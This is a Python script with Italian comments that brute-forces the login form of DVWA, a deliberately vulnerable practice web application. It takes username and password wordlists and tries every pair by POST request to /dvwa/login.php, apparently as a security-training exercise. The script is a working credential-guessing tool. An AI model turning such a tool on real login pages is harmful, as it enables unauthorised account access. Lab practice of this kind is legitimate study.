### IMPORT MODULI ESTERNI

#import moduli esterni
#http.client --> per effettuare connessioni http e ricevere i dati di risposta (header, body etc.)
#urllib.parse --> importata per definire tramite la funzione urlencode i parametri post per la login
#ipaddress --> introdotta per la validazione dell'ip
#os --> check esistenza path inserito
import http.client, urllib.parse, ipaddress, os


### DEFINIZIONE FUNZIONI

#funzione per la validazione dell'indirizzo ip inserito
def is_valid_ip(ip_address):
    #se l'ip è valido ritorna True
    try:
        #ip_address riceve in input la stringa dell'ip e se non è valido genera una eccezione
        ipaddress.ip_address(ip_address)
        return True
    #se entra in exception restituisce false
    except ValueError:
        #chiedo all'utenet di inserire un IP valido
        print("Inserisci una stringa con indirizzo IP valido (e.g. 192.168.1.6) \n")
        return False


### DICHIARAZIONE VARIABILI E CHECK INPUT UTENTE

#inizializzazione a stringa vuota dell'ip
ip_target = ""
path_user = ""
path_password = ""

#Input IP target con validazione
while True:
    #input dall'utente per la stringa ip_target
    ip_target = str(input("Inserisci l'indirizzo IP del target:\n"))
    #esce dall'iterazione solo se l'ip è valido (call function is_valid_ip definita in precedenza)
    if (is_valid_ip(ip_target)):
        break
#chiede l'inserimento del path del file con la lista utenti finchè non viene indicato un path di un file
while not os.path.isfile(path_user):
    #input dall'utente per la stringa path_user
    path_user = str(input("Inserisci percorso file usernames:\n"))

#chiede l'inserimento del path del file con la lista password finchè non viene indicato un path di un file
while not os.path.isfile(path_password):
    #input dall'utente per la stringa path_password
    path_password = str(input("Inserisci percorso file passwords:\n"))


### CORPO PRINCIPALE DEL CODICE

#definizione e apertura file contenenti password e username
username_file = open(path_user)
password_file = open(path_password)

#popolate le variabili list che conterranno la lista di user e password tramite funzione readlines
user_list = username_file.readlines()
pwd_list = password_file.readlines()

#iterazione annidata
#per ogni utente itera su ogni password
for user in user_list:
    #pulisco lo username eliminando gli spazi
    user = user.rstrip()
    for pwd in pwd_list:
        #pulisco la password eliminando gli spazi
        pwd = pwd.rstrip()
        
        #stampa user e password del tentativo corrente
        print (user, "-", pwd)

        #definizione dei parametri da inviare tramite POST con dizionario
        #l'indice di ogni valore deve corrispondere all' attributo name dell'element html
        post_parameters_dvwa = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': 'Login'})
        #costruzione con dizionario di alcuni attributi dell'header che verrà inviato nella POST request
        headers_dvwa = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        
        #viene stabilita la connessione e inviata la richiesta POST con gli attributi definiti sopra
        conn = http.client.HTTPConnection(ip_target, 80)
        conn.request("POST", "/dvwa/login.php", post_parameters_dvwa, headers_dvwa)
        
        #catturiamo la risposta del server
        response = conn.getresponse()
        
        #print(response.headers)
        #print(response.read())
       
        #verifica che sia cambiata la location indicata nell'header e se corrisponde a index.php
        #la login è avvenuta correttamente
        if(response.getheader('location') == "index.php"):
            print ("Login effettuata con:", user, " - ", pwd)
            break
